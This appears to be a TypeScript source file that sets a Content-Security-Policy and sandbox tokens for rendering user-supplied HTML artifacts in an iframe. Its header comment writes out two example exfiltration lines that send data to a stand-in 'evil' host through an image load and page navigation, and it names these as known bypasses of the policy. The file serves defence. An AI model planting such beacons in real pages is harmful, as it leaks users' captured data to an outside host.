// Security policy for rendered artifacts.
//
// Artifacts are arbitrary, user-supplied HTML/JS. We isolate them with a sandboxed iframe
// (no `allow-same-origin`, so they can't touch the app's cookies/DOM) AND a Content-Security-
// Policy that closes the channels a phishing page would use to *exfiltrate* captured data:
//
//   connect-src 'none'  — blocks fetch / XMLHttpRequest / WebSocket / EventSource /
//                         sendBeacon / <a ping>, i.e. every silent background send.
//   form-action 'none'  — blocks <form> submitting to an attacker-controlled URL.
//   base-uri   'none'   — stops a <base> tag from rewriting relative URLs.
//
// Everything else (scripts, styles, images, fonts, media, frames) is left OPEN — including
// inline scripts and eval — so legitimate interactive artifacts (CDN libraries like Chart.js
// or Tailwind, embedded images, etc.) keep working without an allowlist to maintain.
//
// Deliberate, known limitations (full prevention would require serving artifacts from a
// separate origin, which this project does not do):
//   * Resource-load beacons — e.g. `new Image().src = 'https://evil/?c=' + data` — ride the
//     open img-src/script-src and are NOT blocked. Closing them needs an origin allowlist.
//   * Iframe self-navigation — `location = 'https://evil/?c=' + data` — cannot be blocked by
//     CSP (the `navigate-to` directive was removed from browsers) or by the sandbox.
// Net effect: this stops every silent POST-style exfil and all off-the-shelf phishing kits at
// near-zero cost to real artifacts; it is a strong deterrent, not an airtight guarantee.
export const ARTIFACT_CSP =
  "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; " +
  "connect-src 'none'; " +
  "form-action 'none'; " +
  "base-uri 'none'";

// Sandbox tokens for the artifact iframe. `allow-popups` is intentionally omitted so a page
// can't open an attacker window; `allow-same-origin` is omitted so the frame stays cross-origin
// to the app. `allow-forms` stays — form *submission targets* are constrained by form-action.
export const ARTIFACT_SANDBOX = 'allow-scripts allow-forms';

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${ARTIFACT_CSP}">`;

/**
 * Inject the artifact CSP as the first thing in the document's <head> so it governs every
 * resource the page goes on to request. Delivered as a <meta> tag because the content is
 * rendered via an iframe `srcDoc` (there is no HTTP response to carry a header). Additional
 * CSPs an author embeds can only *intersect* ours — they can't loosen it.
 */
export function withArtifactCsp(html: string): string {
  // Most artifacts are full documents with a <head>; insert immediately after it.
  const headOpen = /<head[^>]*>/i.exec(html);
  if (headOpen) {
    const at = headOpen.index + headOpen[0].length;
    return html.slice(0, at) + CSP_META + html.slice(at);
  }
  // No <head>, but an <html> tag: give it a head.
  const htmlOpen = /<html[^>]*>/i.exec(html);
  if (htmlOpen) {
    const at = htmlOpen.index + htmlOpen[0].length;
    return html.slice(0, at) + `<head>${CSP_META}</head>` + html.slice(at);
  }
  // Bare fragment: prepend. The parser hoists a leading meta into an implicit <head>, and with
  // no doctype to displace there's no quirks-mode concern.
  return CSP_META + html;
}
